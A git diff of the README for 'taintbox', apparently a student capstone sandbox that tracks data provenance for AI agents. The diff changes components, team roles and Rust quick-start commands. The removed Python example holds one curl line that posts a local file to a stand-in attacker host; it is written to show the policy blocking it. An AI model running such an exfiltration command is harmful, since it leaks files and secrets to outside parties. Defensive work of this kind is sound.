@@ -58,14 +58,15 @@ Agent (LangChain, smolagents, Custom Harness, SDK)
 
 ### Component Structure
 
-- `src/taintbox/aci/`: Structured tool definitions (`read`, `write`, `exec`, `observe`, `snapshot`, `rewind`, `fetch`) and observation channel.
-- `src/taintbox/taint/`: Provenance tracking ledger, propagation logic, and boundary policy evaluation.
-- `src/taintbox/runtime/`: Sandbox execution backends (isolated process, container, gVisor microVM adapter).
-- `src/taintbox/telemetry/`: Structured event streams and audit trail exporters.
-- `src/taintbox/api/`: REST API service and client SDKs.
-- `src/taintbox/eval/`: Benchmark runners for Paper 1 (Capability) and Paper 2 (Defense).
-- `config/`: Default security policies (`policy.default.yaml`) and runtime configs (`runtime.yaml`).
-- `legacy/tca/`: Historical scaffolding from previous Cross Asset TCA proposal.
+- `src/aci/`: Structured tool definitions (`view_lines`, `search_files`, `grep`, `edit_block`, `fold_output`, `exec`, `fetch`), state tree branching, and autonomous `AgentLoop`.
+- `src/taint/`: Provenance tracking ledger, propagation rules, policy profiles (`Standard`, `Strict`, `AuditOnly`), sensitive path protection, and network allowlisting.
+- `src/walls/`: Overkill-inspired containment walls (`PromptInjectScanner`, `OuroborosWall`, `HalluScan`, `EmergencyStop`).
+- `src/runtime/`: Sandbox execution isolation (`SandboxRuntime` trait and `LocalIsolatedRuntime`).
+- `src/store/`: PostgreSQL persistence with `sqlx` schema migrations and `SessionManager`.
+- `src/metrics/`: Telemetry collector and real-time metrics stream.
+- `src/config/`: Provider management for Spider Cloud scrapers, Ollama bunker, and frontier LLMs.
+- `src/tui/`: Interactive Ratatui Cyber Dark terminal dashboard (`taintbox tui`).
+- `apps/desktop/`: Tauri v2 desktop application shell (`apps/desktop/ui/`).
 
 ---
 
@@ -73,63 +74,52 @@ Agent (LangChain, smolagents, Custom Harness, SDK)
 
 | Role | Owner | Focus Area |
 |---|---|---|
-| **Product Owner / Lead Author** | Harsh | Vision, ACI design, Paper 1 lead, sponsor alignment |
-| **Scrum Master / Process Lead** | Aryamaan | Sprint planning, Kanban, progress reports |
-| **Data and Infrastructure Lead** | Ammar | Runtime, taint engine, eval harness, CI/CD |
-| **Attack and Security Lead** | Akshat | Injection corpus, red team models, Paper 2 lead |
-| **Evaluation and Reliability** | Saathvik | Metrics, reproducibility, ablations, telemetry |
+| **Product Owner / Lead Author** | Harsh | System Architecture, ACI Design, Paper 1 Lead, Sponsor Alignment |
+| **Scrum Master / Process Lead** | Aryamaan | Sprint Planning, Kanban, Progress Reports |
+| **Data and Infrastructure Lead** | Ammar | Sandbox Virtualization (gVisor/MicroVMs), Taint Engine, Eval Harness |
+| **Attack and Security Lead** | Akshat | Synthetic Adversarial Corpus Generator, Red Team Models, Paper 2 Lead |
+| **Evaluation and Reliability** | Saathvik | SWE-bench/Terminal-Bench Ingestor, Metrics, Reproducibility |
 
 ---
 
 ## 5. Quick Start
 
-### Installation & Setup
+### Prerequisites
+* **Rust** (MSRV: 1.78+)
+* **Cargo**
+* *(Optional)* **PostgreSQL 16** & **Ollama** (for local attacker models)
 
-**Option A: Using `uv` (Recommended)**
+### Clone & Build
 ```bash
 git clone https://github.com/xyzmr114/ds440-nittanystreet.git
 cd ds440-nittanystreet
-uv sync
-```
-
-**Option B: Using `pip`**
-```bash
-git clone https://github.com/xyzmr114/ds440-nittanystreet.git
-cd ds440-nittanystreet
-python -m pip install -r requirements-dev.txt -e .
+git checkout harsh-dev
+cargo build
 ```
 
 ### Running Tests
+```bash
+cargo test
+```
+*(All 48 unit & integration tests across 15 suites compile and pass with 0 warnings).*
+
+### Running the Subsystems
 
 ```bash
-# With uv:
-uv run pytest
+# 1. Start the Axum REST API Daemon (Port 8000)
+cargo run -- daemon --port 8000
 
-# Or standard python:
-python -m pytest tests/ -v
-```
+# 2. Launch the Ratatui Cyber Dark Terminal UI
+cargo run -- tui
 
-### Example Usage (Python SDK)
+# 3. Run an autonomous agent task in an isolated sandbox harness
+cargo run -- run "Audit the repository and summarize files" --max-steps 10
 
-```python
-from taintbox.aci.harness import ACIHarness
-from taintbox.models import ProvenanceTag, TrustLevel
+# 4. Run the ExploitBench & Defense Benchmark Evaluation Suite
+cargo run -- eval
 
-# Initialize harness with policy enforcement
-harness = ACIHarness()
-
-# 1. Ingest untrusted content (automatically tagged as untrusted)
-harness.fetch("https://external-site.com/payload.txt", tag=ProvenanceTag.UNTRUSTED_WEB)
-
-# 2. Take a snapshot before taking actions
-snap = harness.snapshot("pre-action")
-
-# 3. Execution attempting exfiltration with tainted data will be blocked
-result = harness.exec("curl", ["https://attacker.com", "--data", "@payload.txt"])
-print(result.status)  # "BLOCKED_BY_POLICY"
-
-# 4. Rewind cleanly to snapshot
-harness.rewind(snap.snapshot_id)
+# 5. Run Environment & Subsystem Health Diagnostics
+cargo run -- doctor
 ```
 
 ---
@@ -137,8 +127,8 @@ harness.rewind(snap.snapshot_id)
 ## 6. Documentation & Specifications
 
 - [`PROPOSAL.md`](PROPOSAL.md) — Official DS 440 capstone proposal document.
-- [`AGENTS.md`](AGENTS.md) — Comprehensive technical specification and ground rules for AI agents and human developers.
-- [`config/policy.default.yaml`](config/policy.default.yaml) — Default boundary rules and trust levels.
+- [`AGENTS.md`](AGENTS.md) — Technical specification and ground rules for AI agents and developers.
+- [`TODO.md`](TODO.md) — Sprint backlog, teammate task assignments, and deadlines.
 
 ---
 
